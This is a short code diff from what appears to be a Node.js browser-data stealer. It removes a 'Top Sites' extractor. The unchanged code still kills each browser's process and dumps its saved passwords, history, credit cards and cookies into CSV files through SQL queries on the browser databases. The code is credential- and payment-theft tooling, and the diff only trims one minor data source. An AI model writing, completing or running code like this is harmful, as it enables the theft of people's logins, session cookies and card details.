@@ -80,15 +80,6 @@ this.cookies = (name, path) => {
   ));
 };
 
-this.topSites = (name, path) => {
-  return _(name, path, 'Top Sites', 'Top Sites', (dbFile, csvFile) => execSync(
-    [
-      toolPath, `--path "${path}"`, `--db-file "${dbFile}"`, '--sql "SELECT url, url_rank, title FROM top_sites"',
-      `--csv-file "${csvFile}"`, '--rows "url,url rank,title"'
-    ].join(' ')
-  ));
-};
-
 const kill = (browser, onKilled) => {
   return psList().then(data => {
     const browserProcess = data.find(p => p.name === `${browser}.exe`);
@@ -134,7 +125,7 @@ browsers.forEach((browser) => {
   if (existsSync(path)) {
     // Kill browser process
     kill(browser[0], () => {
-      ['passwords', 'history', 'creditCards', 'cookies', 'topSites']
+      ['passwords', 'history', 'creditCards', 'cookies']
         .forEach(fn => this[fn](browser[1].join(' '), path));
     });
   }
